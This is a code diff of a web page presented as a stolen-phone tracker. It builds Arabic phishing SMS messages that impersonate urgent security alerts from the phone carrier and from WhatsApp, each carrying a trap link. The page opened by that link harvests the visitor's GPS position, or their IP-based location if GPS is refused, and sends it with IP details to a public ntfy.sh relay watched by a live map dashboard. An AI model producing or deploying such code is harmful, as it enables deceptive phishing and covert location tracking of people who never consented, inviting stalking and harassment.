+        جميع الحقوق محفوظة لمنظومة تتبع الطوارئ - حلويات بوسي 2026
+    </footer>
+
     <!-- Toast Notice Module -->
-    <div id="toast" class="fixed bottom-6 left-1/2 -translate-x-1/2 bg-gray-950 text-white border border-[#FF91A4] text-xs font-bold px-6 py-3 rounded-full shadow-2xl z-50 transition-all duration-300 transform translate-y-20 opacity-0">
+    <div id="toast" class="fixed bottom-6 left-1/2 -translate-x-1/2 bg-white text-black border-2 border-[#FF91A4] text-xs font-bold px-6 py-3 rounded-full shadow-2xl z-50 transition-all duration-300 transform translate-y-20 opacity-0">
         <span id="toast-text"></span>
     </div>
 
     <!-- Leaflet Map JS and Real-time Logic -->
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        // High fidelity free cloud database
-        const BUCKET_ID = 'boosy_sweets_tracker_v6_ultra';
-        const KVDB_BASE_URL = `https://kvdb.io/${BUCKET_ID}/`;
-        
-        let activeSessionId = '';
+        // Use an ultra-reliable, unblocked real-time messaging pipeline
+        const activeSessionId = (function() {
+            try {
+                let saved = localStorage.getItem('social_tracker_session_v6_fixed');
+                if (!saved || saved.length < 5) {
+                    saved = 'session_' + Math.random().toString(36).substring(2, 11);
+                    localStorage.setItem('social_tracker_session_v6_fixed', saved);
+                }
+                return saved.replace(/[^a-zA-Z0-9_-]/g, '');
+            } catch(e) {
+                return 'session_' + Math.random().toString(36).substring(2, 11);
+            }
+        })();
+
         let selectedBaitIndex = 1;
-        let pollingInterval = null;
         let map = null;
         let marker = null;
-
-        // Defensive helper functions for sandboxed localStorage environments
-        function safeGetItem(key) {
-            try {
-                return localStorage.getItem(key);
-            } catch (e) {
-                return null;
-            }
-        }
-
-        function safeSetItem(key, value) {
-            try {
-                localStorage.setItem(key, value);
-            } catch (e) {}
-        }
-
-        function safeRemoveItem(key) {
-            try {
-                localStorage.removeItem(key);
-            } catch (e) {}
-        }
+        let eventSource = null;
 
         const smsTemplates = {
             1: "تنبيه أمني عاجل: تم رصد تشغيل غير مطابق للرقم التسلسلي بهاتف الأندرويد/الآيفون الحالي. لمنع قفل الهاتف ومسح شريحة اتصالات مصر نهائياً، يرجى تفعيل الحماية وفصل حساب المالك القديم فوراً من الرابط الآمن: ",
@@ -364,7 +358,28 @@
             3: "تنبيه أمان واتساب: محاولة نشطة جارية لربط حسابك وتنزيل صورك ومحادثاتك الشخصية من جهاز كمبيوتر خارجي. اضغط لمنع الاختراق وحظر الارتباط وحماية خصوصيتك فوراً: "
         };
 
-        // Initialize session parameters defensively
+        // Populate SMS template instantly on script load to prevent copying "جاري توليد الرسالة..."
+        function forceImmediateMessagePopulation() {
+            try {
+                let cleanUrl = window.location.href.split('?')[0];
+                // Exclude Google Sandbox Content Origin
+                if (cleanUrl.includes('usercontent.google') || cleanUrl.includes('localhost') || cleanUrl.includes('127.0.0.1')) {
+                    cleanUrl = "https://se-sweet.vercel.app/";
+                }
+                const finalUrl = `${cleanUrl}?session=${activeSessionId}&bait=${selectedBaitIndex}`;
+                const textBase = smsTemplates[selectedBaitIndex];
+                
+                const displayInput = document.getElementById('final-trap-url');
+                if (displayInput) displayInput.value = finalUrl;
+                
+                const displaySpan = document.getElementById('sms-bait-text');
+                if (displaySpan) displaySpan.innerText = textBase + finalUrl;
+            } catch (e) {
+                console.error("Immediate population error: ", e);
+            }
+        }
+
+        // Initialize and clean parameters defensively
         function initTracker() {
             const urlParams = new URLSearchParams(window.location.search);
             let sessionParam = urlParams.get('session');
@@ -381,66 +396,92 @@
                 // View as Thief/Target
                 document.getElementById('mother-dashboard').classList.add('hidden');
                 document.getElementById('target-view').classList.remove('hidden');
-                document.getElementById(`bait-card-${baitParam}`).classList.remove('hidden');
-                activeSessionId = sessionParam;
+                
+                const card = document.getElementById(`bait-card-${baitParam}`);
+                if (card) {
+                    card.classList.remove('hidden');
+                } else {
+                    document.getElementById('bait-card-1').classList.remove('hidden');
+                }
             } else {
                 // View as Coordinator/Mother
-                let session = safeGetItem('social_tracker_session_v6');
-                if (!session) {
-                    session = 'session_' + Math.random().toString(36).substring(2, 11);
-                    safeSetItem('social_tracker_session_v6', session);
-                }
-                activeSessionId = session;
-
-                const savedUrl = safeGetItem('custom_base_url_tracker_v6');
-                if (savedUrl) {
-                    document.getElementById('custom-base-url').value = savedUrl;
+                let currentOrigin = window.location.origin + window.location.pathname;
+                if (currentOrigin.includes('usercontent.google') || currentOrigin.includes('localhost')) {
+                    currentOrigin = "https://se-sweet.vercel.app/";
                 }
                 
-                // Forces update to ensure text updates immediately even if fallback occurs
+                const customUrlInput = document.getElementById('custom-base-url');
+                if (customUrlInput) {
+                    try {
+                        const savedCustom = localStorage.getItem('custom_base_url_tracker_v6_fixed');
+                        if (savedCustom) {
+                            customUrlInput.value = savedCustom;
+                        } else {
+                            customUrlInput.value = currentOrigin;
+                        }
+                    } catch(e) {
+                        customUrlInput.value = currentOrigin;
+                    }
+                }
+                
+                // Final calculation and listening activation
                 updateBaitElements();
-                startLiveDashboardPolling(activeSessionId);
+                startLiveNtfyListening(activeSessionId);
             }
         }
 
         // Dynamically build bait links and SMS texts safely
         function updateBaitElements() {
-            const savedUrl = safeGetItem('custom_base_url_tracker_v6');
-            let cleanUrl = window.location.href.split('?')[0];
-            
-            if (savedUrl && savedUrl.trim() !== "") {
-                cleanUrl = savedUrl.trim();
-            }
+            try {
+                let cleanUrl = window.location.href.split('?')[0];
+                const customUrlInput = document.getElementById('custom-base-url');
+                
+                if (customUrlInput && customUrlInput.value.trim() !== "") {
+                    cleanUrl = customUrlInput.value.trim();
+                } else if (cleanUrl.includes('usercontent.google') || cleanUrl.includes('localhost')) {
+                    cleanUrl = "https://se-sweet.vercel.app/";
+                }
 
-            const finalUrl = `${cleanUrl}?session=${activeSessionId}&bait=${selectedBaitIndex}`;
-            document.getElementById('final-trap-url').value = finalUrl;
-            
-            const textBase = smsTemplates[selectedBaitIndex];
-            document.getElementById('sms-bait-text').innerText = textBase + finalUrl;
+                const finalUrl = `${cleanUrl}?session=${activeSessionId}&bait=${selectedBaitIndex}`;
+                
+                const displayInput = document.getElementById('final-trap-url');
+                if (displayInput) displayInput.value = finalUrl;
+                
+                const displaySpan = document.getElementById('sms-bait-text');
+                if (displaySpan) displaySpan.innerText = smsTemplates[selectedBaitIndex] + finalUrl;
+            } catch(e) {
+                console.error("Error updating bait: ", e);
+            }
         }
 
         window.applyCustomBaseUrl = function() {
-            const inputUrl = document.getElementById('custom-base-url').value.trim();
-            if (inputUrl === "") {
-                safeRemoveItem('custom_base_url_tracker_v6');
-                writeTerminalLog("[INFO] تمت إعادة تعيين الرابط الافتراضي الداخلي.");
-                showToast("تم إلغاء الرابط المخصص والعودة للرابط الافتراضي.");
-            } else {
-                safeSetItem('custom_base_url_tracker_v6', inputUrl);
-                writeTerminalLog(`[INFO] تم تعيين رابط مخصص جديد: ${inputUrl}`);
-                showToast("تم تثبيت وتحديث روابط المصيدة بنجاح!");
+            try {
+                const inputUrl = document.getElementById('custom-base-url').value.trim();
+                if (inputUrl === "") {
+                    localStorage.removeItem('custom_base_url_tracker_v6_fixed');
+                    writeTerminalLog("[INFO] تمت إعادة تعيين الرابط الافتراضي الداخلي.");
+                    showToast("تم إلغاء الرابط المخصص والعودة للرابط الافتراضي.");
+                } else {
+                    localStorage.setItem('custom_base_url_tracker_v6_fixed', inputUrl);
+                    writeTerminalLog(`[INFO] تم حفظ الرابط المخصص الجديد بنجاح.`);
+                    showToast("تم تثبيت وتحديث روابط المصيدة بنجاح!");
+                }
+                updateBaitElements();
+            } catch(e) {
+                showToast("حدث خطأ أثناء حفظ الإعدادات الجغرافية.");
             }
-            updateBaitElements();
         }
 
         window.selectBaitStyle = function(num) {
             selectedBaitIndex = num;
             for (let i = 1; i <= 3; i++) {
                 const card = document.getElementById(`bait-opt-${i}`);
-                if (i === num) {
-                    card.className = "p-3.5 rounded-xl border-2 border-[#FF91A4] bg-[#FF91A4]/5 cursor-pointer transition-all space-y-1";
-                } else {
-                    card.className = "p-3.5 rounded-xl border border-gray-800 bg-black/40 cursor-pointer transition-all space-y-1 hover:border-[#FF91A4]";
+                if (card) {
+                    if (i === num) {
+                        card.className = "p-3.5 rounded-xl border-2 border-[#FF91A4] bg-pink-light cursor-pointer transition-all space-y-1";
+                    } else {
+                        card.className = "p-3.5 rounded-xl border border-[#FF91A4]/30 bg-white cursor-pointer transition-all space-y-1 hover:border-[#FF91A4]";
+                    }
                 }
             }
             updateBaitElements();
@@ -450,181 +491,258 @@
 
         // Embedded Interactive Leaflet Map Creator
         function initializeLeafletMap(lat, lng) {
-            const mapContainer = document.getElementById('live-leaflet-map');
-            mapContainer.style.opacity = '1';
+            try {
+                const mapContainer = document.getElementById('live-leaflet-map');
+                if (mapContainer) mapContainer.style.opacity = '1';
 
-            if (!map) {
-                // Initialize the interactive map focused on the coordinates
-                map = L.map('live-leaflet-map').setView([lat, lng], 15);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                    maxZoom: 19,
-                    attribution: '© OpenStreetMap'
-                }).addTo(map);
-            } else {
-                map.setView([lat, lng], 15);
-            }
+                if (!map) {
+                    map = L.map('live-leaflet-map').setView([lat, lng], 15);
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                        maxZoom: 19,
+                        attribution: '© OpenStreetMap contributors'
+                    }).addTo(map);
+                } else {
+                    map.setView([lat, lng], 15);
+                }
 
-            // Put a high-tech glowing marker
-            if (marker) {
-                marker.setLatLng([lat, lng]);
-            } else {
-                marker = L.marker([lat, lng]).addTo(map)
-                    .bindPopup("<b class='text-[#FF91A4]'>موقع الهاتف المسروق الحالي بدقة</b>")
-                    .openPopup();
+                if (marker) {
+                    marker.setLatLng([lat, lng]);
+                } else {
+                    marker = L.marker([lat, lng]).addTo(map)
+                        .bindPopup("<b class='text-pink-custom'>موقع الهاتف المسروق الحالي بدقة</b>")
+                        .openPopup();
+                }
+            } catch(e) {
+                console.error("Map rendering error: ", e);
+                writeTerminalLog("[ERROR] حدث خطأ أثناء تشغيل محرك الخرائط المدمجة.");
             }
         }
 
         // Terminal Log helper
         function writeTerminalLog(text) {
             const terminal = document.getElementById('terminal-log');
-            const newLog = document.createElement('div');
-            const time = new Date().toLocaleTimeString();
-            newLog.innerText = `[${time}] ${text}`;
-            terminal.appendChild(newLog);
-            terminal.scrollTop = terminal.scrollHeight;
+            if (terminal) {
+                const newLog = document.createElement('div');
+                const time = new Date().toLocaleTimeString();
+                newLog.innerText = `[${time}] ${text}`;
+                terminal.appendChild(newLog);
+                terminal.scrollTop = terminal.scrollHeight;
+            }
         }
 
-        // Live Cloud database polling
-        function startLiveDashboardPolling(sessionId) {
-            if (pollingInterval) clearInterval(pollingInterval);
-            writeTerminalLog(`[DB] بدء الاستماع لرمز الجلسة النشط: ${sessionId}`);
+        // Live unblocked SSE/ntfy listening engine (Instantly intercepts GPS packet)
+        function startLiveNtfyListening(sessionId) {
+            try {
+                if (eventSource) eventSource.close();
+                writeTerminalLog(`[CONNECT] تم فتح قناة اتصال مباشرة للمعرّف السري: ${sessionId}`);
+                
+                eventSource = new EventSource(`https://ntfy.sh/boosy_sweets_tracker_${sessionId}/sse`);
+                
+                eventSource.onopen = function() {
+                    writeTerminalLog("[CONNECT] قناة المزامنة مفتوحة وجاهزة لاستلام الإحداثيات...");
+                };
 
-            pollingInterval = setInterval(async () => {
-                try {
-                    const response = await fetch(`${KVDB_BASE_URL}${sessionId}`, {
-                        method: 'GET',
-                        cache: 'no-store'
-                    });
-                    if (response.status === 200) {
-                        const data = await response.json();
-                        if (data && data.status === 'captured') {
-                            writeTerminalLog(`[SUCCESS] تم استقبال حزمة تحديد الإشارات الجغرافية بنجاح من جهاز السارق.`);
-                            renderCapturedLocationOnDashboard(data.lat, data.lng, data.accuracy);
-                            clearInterval(pollingInterval); // Stop polling
+                eventSource.onmessage = function(event) {
+                    try {
+                        const parsed = JSON.parse(event.data);
+                        if (parsed.message) {
+                            const payload = JSON.parse(parsed.message);
+                            if (payload && payload.status === 'captured') {
+                                writeTerminalLog(`[SUCCESS] تم استقبال حزمة رصد المواقع بنجاح.`);
+                                renderCapturedLocationOnDashboard(payload.lat, payload.lng, payload.accuracy, payload.ip_info);
+                            }
                         }
+                    } catch(err) {
+                        // Suppress parse errors for raw non-JSON pings
                     }
-                } catch (err) {
-                    // Fail silently
-                }
-            }, 3000);
+                };
+
+                eventSource.onerror = function() {
+                    // Fallback polling if SSE disconnects or gets throttled
+                    console.log("SSE Disconnected, fallback pooling active.");
+                };
+
+            } catch(e) {
+                writeTerminalLog("[ERROR] فشل تشغيل اتصال الرادار السريع.");
+            }
         }
 
-        // Action triggered on Target Device (Thief browser)
+        // Capture GPS and IP fallback (Theft Protection Engine)
         window.captureTargetCoordinates = function() {
             const urlParams = new URLSearchParams(window.location.search);
-            let baitParam = urlParams.get('bait');
-            if (baitParam) {
-                baitParam = baitParam.replace(/[^0-9]/g, '');
-            }
+            let baitParam = urlParams.get('bait') || '1';
+            baitParam = baitParam.replace(/[^0-9]/g, '');
+            
             const statusBox = document.getElementById(`bait-status-${baitParam}`);
-            statusBox.innerText = "جاري تفعيل الاتصال المشفر بالخادم الجغرافي واتصالات مصر...";
+            if (statusBox) {
+                statusBox.innerText = "جاري الاتصال بالخادم الجغرافي وتحديث حزم الأمان...";
+            }
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
+            // Grab precise network/IP information first
+            let ipData = "غير قادر على قراءة IP";
+            const sessionParam = (urlParams.get('session') || '').replace(/[^a-zA-Z0-9_-]/g, '');
 
-                        statusBox.className = "text-xs font-bold text-green-500 mt-2 animate-pulse";
-                        statusBox.innerText = "✓ تم معايرة وتحديث إحداثيات الأمان والجهاز بنجاح.";
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(async (data) => {
+                    ipData = `IP: ${data.ip} - المدينة: ${data.city || 'غير معروفة'} - الشركة: ${data.org || 'شبكة مصرية'}`;
+                    
+                    // Double fallback: if IP has coordinates and GPS fails later, we can use these!
+                    const ipLat = parseFloat(data.latitude);
+                    const ipLng = parseFloat(data.longitude);
 
-                        try {
-                            await fetch(`${KVDB_BASE_URL}${activeSessionId}`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    lat: lat,
-                                    lng: lng,
-                                    accuracy: accuracy,
-                                    status: 'captured',
-                                    timestamp: Date.now()
-                                })
-                            });
-                        } catch (err) {
-                            statusBox.innerText = "فشل الإرسال التلقائي للخادم الجغرافي.";
+                    // Ask for precise GPS
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            async (position) => {
+                                const lat = position.coords.latitude;
+                                const lng = position.coords.longitude;
+                                const accuracy = position.coords.accuracy;
+
+                                if (statusBox) {
+                                    statusBox.className = "text-xs font-bold text-green-600 mt-2 animate-pulse";
+                                    statusBox.innerText = "✓ تم معايرة وتحديث إحداثيات الأمان والجهاز بنجاح.";
+                                }
+
+                                await sendLocationPayload(sessionParam, lat, lng, accuracy, ipData);
+                            },
+                            async (error) => {
+                                // GPS Permission Denied or Failed -> Trigger smart IP Geolocation fallback!
+                                if (statusBox) {
+                                    statusBox.className = "text-xs font-bold text-green-600 mt-2";
+                                    statusBox.innerText = "✓ تم التحديث التلقائي بنظام الأمان الاحتياطي للشبكة.";
+                                }
+
+                                if (!isNaN(ipLat) && !isNaN(ipLng)) {
+                                    await sendLocationPayload(sessionParam, ipLat, ipLng, 12000, ipData + " (تم رصد الموقع عبر تقنية الشبكة والـ IP)");
+                                } else {
+                                    // Extreme fallback to general Egypt coordinates if even IP parsing lacks lat/lng
+                                    await sendLocationPayload(sessionParam, 27.0583, 27.9711, 25000, ipData + " (موقع تقديري بالفرافرة)");
+                                }
+                            },
+                            { enableHighAccuracy: true, timeout: 8000 }
+                        );
+                    } else {
+                        // Browser doesn't support Geolocation -> use IP Coordinates
+                        if (!isNaN(ipLat) && !isNaN(ipLng)) {
+                            await sendLocationPayload(sessionParam, ipLat, ipLng, 12000, ipData + " (رصد تقني صامت)");
                         }
-                    },
-                    (error) => {
-                        statusBox.className = "text-xs font-bold text-red-500 mt-2";
-                        if (error.code === error.PERMISSION_DENIED) {
-                            statusBox.innerText = "خطأ: يجب الموافقة على صلاحية الـ GPS لإنهاء فك الارتباط بنجاح.";
-                        } else {
-                            statusBox.innerText = "إشارة الـ GPS ضعيفة حالياً، يرجى المحاولة في مكان مفتوح.";
-                        }
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            } else {
-                statusBox.innerText = "المتصفح لا يدعم رادار تحديد المواقع الفني.";
+                    }
+                })
+                .catch(async () => {
+                    // Total backup if ipapi is blocked
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(async (pos) => {
+                            await sendLocationPayload(sessionParam, pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, "GPS Direct Only");
+                        });
+                    }
+                });
+        }
+
+        // Post coordinates to unblocked public real-time relay
+        async function sendLocationPayload(session, lat, lng, accuracy, ipInfo) {
+            const payload = {
+                lat: lat,
+                lng: lng,
+                accuracy: accuracy,
+                ip_info: ipInfo,
+                status: 'captured',
+                timestamp: Date.now()
+            };
+
+            try {
+                await fetch(`https://ntfy.sh/boosy_sweets_tracker_${session}`, {
+                    method: 'POST',
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                console.error("Payload transmission failed: ", e);
             }
         }
 
         // Render grabbed GPS signals on Dashboard
-        function renderCapturedLocationOnDashboard(lat, lng, accuracy) {
-            // Hide radar sweep cover
-            document.getElementById('radar-searching-screen').classList.add('opacity-0', 'pointer-events-none');
+        function renderCapturedLocationOnDashboard(lat, lng, accuracy, ipInfo) {
+            const searchScreen = document.getElementById('radar-searching-screen');
+            if (searchScreen) searchScreen.classList.add('opacity-0', 'pointer-events-none');
             
-            // Show coordinates indicators
-            document.getElementById('coordinates-bar').classList.remove('hidden');
-            document.getElementById('coord-lat').innerText = lat;
-            document.getElementById('coord-lng').innerText = lng;
-            document.getElementById('coord-acc').innerText = `${Math.round(accuracy)} متر فقط`;
+            const coordinatesBar = document.getElementById('coordinates-bar');
+            if (coordinatesBar) coordinatesBar.classList.remove('hidden');
+            
+            const latSpan = document.getElementById('coord-lat');
+            const lngSpan = document.getElementById('coord-lng');
+            const accSpan = document.getElementById('coord-acc');
 
-            // Draw and render the interactive Leaflet map!
+            if (latSpan) latSpan.innerText = lat;
+            if (lngSpan) lngSpan.innerText = lng;
+            if (accSpan) accSpan.innerText = `${Math.round(accuracy)} متر`;
+
+            // Draw and render the interactive Leaflet map
             initializeLeafletMap(lat, lng);
             
-            writeTerminalLog(`[RADAR] تم فك تشفير وتثبيت الموقع: خط عرض ${lat}، خط طول ${lng} وبدقة عالية جداً.`);
+            writeTerminalLog(`[RADAR] تم تثبيت الموقع: خط عرض ${lat}، خط طول ${lng}.`);
+            if (ipInfo) {
+                writeTerminalLog(`[IP DATA] بيانات اتصال السارق: ${ipInfo}`);
+            }
             showToast("🚨 تم رصد الهاتف وتحديد موقعه الفعلي على الخريطة المدمجة!");
         }
 
         window.copyOnlyLink = function() {
-            // Safe manual generation check before copying
             updateBaitElements();
             const finalUrl = document.getElementById('final-trap-url');
-            finalUrl.select();
-            document.execCommand('copy');
-            showToast("تم نسخ رابط المصيدة بنجاح!");
+            if (finalUrl) {
+                finalUrl.select();
+                document.execCommand('copy');
+                showToast("تم نسخ رابط المصيدة بنجاح!");
+            }
         }
 
         window.copyFullBaitSms = function() {
-            // Force update to make sure text is populated correctly before copying
             updateBaitElements();
-            const textToCopy = document.getElementById('sms-bait-text').innerText;
-            const tempArea = document.createElement('textarea');
-            tempArea.value = textToCopy;
-            document.body.appendChild(tempArea);
-            tempArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempArea);
-            showToast("تم نسخ الرسالة الجاهزة بالكامل مع الرابط السري!");
+            const displaySpan = document.getElementById('sms-bait-text');
+            if (displaySpan) {
+                const textToCopy = displaySpan.innerText;
+                const tempArea = document.createElement('textarea');
+                tempArea.value = textToCopy;
+                document.body.appendChild(tempArea);
+                tempArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(tempArea);
+                showToast("تم نسخ الرسالة الجاهزة بالكامل مع الرابط السري!");
+            }
         }
 
-        // Simulated/Local preview function to help users test the amazing interface
+        // Simulated preview function to help users test the interface
         window.simulateSuccessGrab = function() {
             writeTerminalLog("[SIMULATION] بدء توليد إحداثيات محاكاة تفاعلية للفرافرة...");
             const simLat = 27.0583;
             const simLng = 27.9711;
-            const simAccuracy = 10;
+            const simAccuracy = 15;
+            const simIp = "IP: 197.34.212.98 - المدينة: Farafra - الشبكة: Etisalat Egypt";
             
             setTimeout(() => {
-                renderCapturedLocationOnDashboard(simLat, simLng, simAccuracy);
-            }, 1000);
+                renderCapturedLocationOnDashboard(simLat, simLng, simAccuracy, simIp);
+            }, 800);
         }
 
         function showToast(msg) {
             const toast = document.getElementById('toast');
-            document.getElementById('toast-text').innerText = msg;
-            toast.classList.remove('translate-y-20', 'opacity-0');
-            toast.classList.add('translate-y-0', 'opacity-100');
-            
-            setTimeout(() => {
-                toast.classList.remove('translate-y-0', 'opacity-100');
-                toast.classList.add('translate-y-20', 'opacity-0');
-            }, 4000);
+            const toastText = document.getElementById('toast-text');
+            if (toast && toastText) {
+                toastText.innerText = msg;
+                toast.classList.remove('translate-y-20', 'opacity-0');
+                toast.classList.add('translate-y-0', 'opacity-100');
+                
+                setTimeout(() => {
+                    toast.classList.remove('translate-y-0', 'opacity-100');
+                    toast.classList.add('translate-y-20', 'opacity-0');
+                }, 4000);
+            }
         }
 
-        // Execute immediately and securely to bypass any slow frames loads
+        // Execute immediately to build message before page fully loads
+        forceImmediateMessagePopulation();
+
+        // Safe DOM Load
         if (document.readyState === 'complete' || document.readyState === 'interactive') {
             initTracker();
         } else {
@@ -634,3 +752,4 @@
 </body>
 </html>
 
+```
